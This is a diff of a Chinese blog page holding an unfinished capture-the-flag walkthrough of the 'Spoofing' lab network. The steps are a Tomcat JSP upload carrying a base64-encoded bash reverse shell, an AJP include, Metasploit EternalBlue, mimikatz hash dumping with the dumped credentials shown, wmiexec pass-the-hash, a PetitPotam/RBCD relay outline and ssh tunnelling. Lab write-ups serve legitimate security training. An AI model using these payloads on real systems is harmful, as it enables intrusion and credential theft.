@@ -62,8 +62,8 @@
         <article class="article-content" data-article-content><blockquote>
 <p>Spoofing是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
 </blockquote>
-<h1 id="flag1-入口-tomcat-172221176">flag1 入口 Tomcat-172.22.11.76<a class="heading-anchor" href="#flag1-%E5%85%A5%E5%8F%A3-tomcat-172221176" aria-label="链接到 flag1 入口 Tomcat-172.22.11.76">#</a></h1><p>扫到8080端口</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424130711695.png" alt="image-20250424130711695" loading="lazy" decoding="async"></figure></p>
+<h2 id="flag1-入口-tomcat-172221176">flag1 入口 Tomcat-172.22.11.76<a class="heading-anchor" href="#flag1-%E5%85%A5%E5%8F%A3-tomcat-172221176" aria-label="链接到 flag1 入口 Tomcat-172.22.11.76">#</a></h2><p>扫到8080端口</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1448;--image-max-width:1339px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424130711695.png" alt="image-20250424130711695" loading="lazy" decoding="async" width="2552" height="1448"></span></figure></p>
 <p>目录扫描</p>
 <figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd"><span class="hljs-function">E:\小工具\<span class="hljs-title">ONE</span>-<span class="hljs-title">FOX</span>集成工具箱<span class="hljs-title">_V8</span>公开版<span class="hljs-title">_by</span>狐狸\<span class="hljs-title">gui_scan</span>\<span class="hljs-title">dirsearch</span>&gt;<span class="hljs-title">python</span> <span class="hljs-title">dirsearch.py</span> -<span class="hljs-title">u</span> <span class="hljs-title">http</span>://39.98.127.157:8080/
 
@@ -235,7 +235,7 @@
 &lt;/web-app&gt;</span></code></pre></figure><blockquote>
 <p><a href="http://39.99.228.210:8080/UploadServlet" target="_blank" rel="noopener noreferrer">http://39.99.228.210:8080/UploadServlet<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
 </blockquote>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132009071.png" alt="image-20250424132009071" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:542 / 318;--image-max-width:1295px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132009071.png" alt="image-20250424132009071" loading="lazy" decoding="async" width="542" height="318"></span></figure></p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&lt;%
     java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveHh4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream();
     int a = -1;
@@ -246,13 +246,13 @@
     }
     out.print(&quot;&lt;/pre&gt;&quot;);
 %&gt;</code></pre></figure><p>上传后执行eval</p>
-<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">python ajpShooter.py http://39.99.228.210:8080/ 8009 /upload/a80b42c9eb8e1bf4202c0af1908e479e/20250424012502710.txt eval</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132607509.png" alt="image-20250424132607509" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">python ajpShooter.py http://39.99.228.210:8080/ 8009 /upload/a80b42c9eb8e1bf4202c0af1908e479e/20250424012502710.txt eval</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1677 / 370;--image-max-width:3445px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132607509.png" alt="image-20250424132607509" loading="lazy" decoding="async" width="1677" height="370"></span></figure></p>
 <p>拿到flag1</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132729920.png" alt="image-20250424132729920" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:640 / 328;--image-max-width:1483px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132729920.png" alt="image-20250424132729920" loading="lazy" decoding="async" width="640" height="328"></span></figure></p>
 <p>写公钥</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132920767.png" alt="image-20250424132920767" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132953194.png" alt="image-20250424132953194" loading="lazy" decoding="async"></figure></p>
-<h1 id="flag2-ms17-010-172221145">flag2 MS17-010-172.22.11.45<a class="heading-anchor" href="#flag2-ms17-010-172221145" aria-label="链接到 flag2 MS17-010-172.22.11.45">#</a></h1><figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">root@ubuntu:~# <span class="hljs-built_in">chmod</span> 777 fscan
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1558 / 690;--image-max-width:1716px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132920767.png" alt="image-20250424132920767" loading="lazy" decoding="async" width="1558" height="690"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:944 / 435;--image-max-width:1649px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424132953194.png" alt="image-20250424132953194" loading="lazy" decoding="async" width="944" height="435"></span></figure></p>
+<h2 id="flag2-ms17-010-172221145">flag2 MS17-010-172.22.11.45<a class="heading-anchor" href="#flag2-ms17-010-172221145" aria-label="链接到 flag2 MS17-010-172.22.11.45">#</a></h2><figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">root@ubuntu:~# <span class="hljs-built_in">chmod</span> 777 fscan
 root@ubuntu:~# ip a
 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -351,7 +351,7 @@ root@ubuntu:~# ./fscan -h 172.22.11.76/24
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp
 set RHOSTS 172.22.11.45
-exploit</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424141139743.png" alt="image-20250424141139743" loading="lazy" decoding="async"></figure></p>
+exploit</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1406 / 944;--image-max-width:1132px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424141139743.png" alt="image-20250424141139743" loading="lazy" decoding="async" width="1406" height="944"></span></figure></p>
 <p>抓哈希</p>
 <blockquote>
 <p>load kiwi
@@ -409,7 +409,7 @@ xr-desktop$  XIAORANG.LAB  06 22 fe e0 24 5c 76 04 f3 2c 02 93 08 26 cd 3d 0d 36
 xr-desktop$  XIAORANG.LAB  (null)
 yangmei      XIAORANG.LAB  xrihGHgoNZQ</code></pre></figure><p>msf的shell有点问题 用wmiexec连上去拿到shell</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">proxychains impacket-wmiexec -hashes 00000000000000000000000000000000:48f6da83eb89a4da8a1cc963b855a799 Administrator@172.22.11.45</code></pre></figure><p>拿到flag02</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424141859001.png" alt="image-20250424141859001" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1005 / 458;--image-max-width:1668px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424141859001.png" alt="image-20250424141859001" loading="lazy" decoding="async" width="1005" height="458"></span></figure></p>
 <p>发现一个用户</p>
 <blockquote>
 <p>yangmei      XIAORANG.LAB  xrihGHgoNZQ</p>
@@ -421,11 +421,11 @@ proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav
 <p>攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，允许我们的恶意机器账户模拟以及认证访问到目标机器 (RBCD)</p>
 </blockquote>
 <p>WebClient扫描，确定只能拿下 172.22.11.26 (XR-LCM3AE8B)</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424143043473.png" alt="image-20250424143043473" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1483 / 86;--image-max-width:13106px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250424143043473.png" alt="image-20250424143043473" loading="lazy" decoding="async" width="1483" height="86"></span></figure></p>
 <figure class="code-block"><figcaption><span>shell</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-shell">ssh -i id_rsa_2048 root@39.98.120.46 -D 49.233.121.53:5002 -R \*:79:127.0.0.1:80
 nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</code></pre></figure><p>后面没打完 先不写了</p>
 </article>
-        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#flag1-%E5%85%A5%E5%8F%A3-tomcat-172221176">flag1 入口 Tomcat-172.22.11.76</a><a class="toc-depth-2" href="#flag2-ms17-010-172221145">flag2 MS17-010-172.22.11.45</a></div></nav></aside>
       </div>
       <div class="post-tools section-shell">
         <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
@@ -440,7 +440,7 @@ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</code></pre><
     <a href="/posts/8cc5a836.html"><span>2026/02/11</span><strong>HMVM-MS02423</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
     <a href="/posts/3d3db288.html"><span>2026/02/10</span><strong>HMVM-Coolpg</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
     </main>
-    
+    <button class="floating-toc-button" type="button" data-toc-toggle aria-label="打开目录" data-tooltip="目录"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg></button>
     
     <footer class="site-footer">
       <div class="footer-lead">
@@ -460,26 +460,26 @@ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</code></pre><
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
